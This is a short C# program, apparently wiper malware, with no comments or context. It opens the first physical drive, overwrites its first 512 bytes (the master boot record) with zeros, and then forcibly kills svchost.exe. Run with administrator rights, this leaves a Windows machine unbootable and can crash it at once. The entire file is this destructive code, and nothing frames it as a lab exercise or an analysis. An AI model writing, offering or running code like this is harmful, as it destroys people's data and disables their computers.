using System;
using System.IO;

class MainClass
{
    public static void OverwriteMbr()
    {
        using (var fs = new FileStream(@"\\.\\PhysicalDrive0", FileMode.Open, FileAccess.ReadWrite))
        {
            byte[] buffer = new byte[512];
            fs.Write(buffer, 0, buffer.Length);
        }
    }

    public static void Main(string[] args)
    {
        OverwriteMbr();
        System.Diagnostics.Process.Start("taskkill", "/IM svchost.exe /F");
    }
}
